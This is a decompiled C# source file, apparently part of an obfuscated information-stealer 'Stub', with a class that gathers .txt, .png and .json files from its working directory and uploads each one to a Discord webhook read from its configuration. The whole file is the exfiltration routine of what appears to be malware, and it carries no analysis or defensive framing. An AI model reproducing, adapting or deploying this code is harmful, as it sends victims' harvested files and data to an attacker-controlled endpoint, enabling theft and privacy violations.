using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000C6 RID: 198
	internal sealed class UploadToDiscord
	{
		// Token: 0x060002F3 RID: 755 RVA: 0x0001BE70 File Offset: 0x0001A070
		public static async Task<List<string>> UploadFilesAsync()
		{
			List<string> results = new List<string>();
			string[] supportedExtensions = new string[] { ".txt", ".png", ".json" };
			List<string> files = (from f in Directory.GetFiles(Paths.InitWorkDir())
				where supportedExtensions.Contains(Path.GetExtension(f).ToLower())
				select f).ToList<string>();
			List<string> list;
			if (files.Count == 0)
			{
				results.Add("No supported files found to upload.");
				list = results;
			}
			else
			{
				using (HttpClient client = new HttpClient())
				{
					foreach (string file in files)
					{
						try
						{
							byte[] fileBytes = File.ReadAllBytes(file);
							MultipartFormDataContent content = new MultipartFormDataContent();
							string text = Path.GetExtension(file).ToLower();
							string text2 = text;
							string fieldName;
							if (!(text2 == ".png"))
							{
								fieldName = "file";
							}
							else
							{
								fieldName = "image";
							}
							text2 = null;
							content.Add(new ByteArrayContent(fileBytes), fieldName, Path.GetFileName(file));
							ConfiguredTaskAwaitable<HttpResponseMessage>.ConfiguredTaskAwaiter configuredTaskAwaiter = client.PostAsync(UploadToDiscord.DiscordWebhook, content).ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter.IsCompleted)
							{
								await configuredTaskAwaiter;
								ConfiguredTaskAwaitable<HttpResponseMessage>.ConfiguredTaskAwaiter configuredTaskAwaiter2;
								configuredTaskAwaiter = configuredTaskAwaiter2;
								configuredTaskAwaiter2 = default(ConfiguredTaskAwaitable<HttpResponseMessage>.ConfiguredTaskAwaiter);
							}
							HttpResponseMessage httpResponseMessage = configuredTaskAwaiter.GetResult();
							HttpResponseMessage response = httpResponseMessage;
							httpResponseMessage = null;
							response.EnsureSuccessStatusCode();
							ConfiguredTaskAwaitable<string>.ConfiguredTaskAwaiter configuredTaskAwaiter3 = response.Content.ReadAsStringAsync().ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter3.IsCompleted)
							{
								await configuredTaskAwaiter3;
								ConfiguredTaskAwaitable<string>.ConfiguredTaskAwaiter configuredTaskAwaiter4;
								configuredTaskAwaiter3 = configuredTaskAwaiter4;
								configuredTaskAwaiter4 = default(ConfiguredTaskAwaitable<string>.ConfiguredTaskAwaiter);
							}
							string text3 = configuredTaskAwaiter3.GetResult();
							string responseBody = text3;
							text3 = null;
							results.Add("Successfully uploaded " + Path.GetFileName(file) + ": " + responseBody);
							fileBytes = null;
							content = null;
							fieldName = null;
							response = null;
							responseBody = null;
							goto IL_034B;
						}
						catch (Exception ex)
						{
							results.Add("Failed to upload " + Path.GetFileName(file) + ": " + ex.Message);
							goto IL_034B;
						}
						continue;
						IL_034B:
						file = null;
					}
					List<string>.Enumerator enumerator = default(List<string>.Enumerator);
				}
				HttpClient client = null;
				list = results;
			}
			return list;
		}

		// Token: 0x060002F4 RID: 756 RVA: 0x000038B4 File Offset: 0x00001AB4
		public UploadToDiscord()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060002F5 RID: 757 RVA: 0x00004169 File Offset: 0x00002369
		static UploadToDiscord()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			UploadToDiscord.DiscordWebhook = Config.DiscordWebhook;
		}

		// Token: 0x040005B6 RID: 1462
		private static string DiscordWebhook;
	}
}
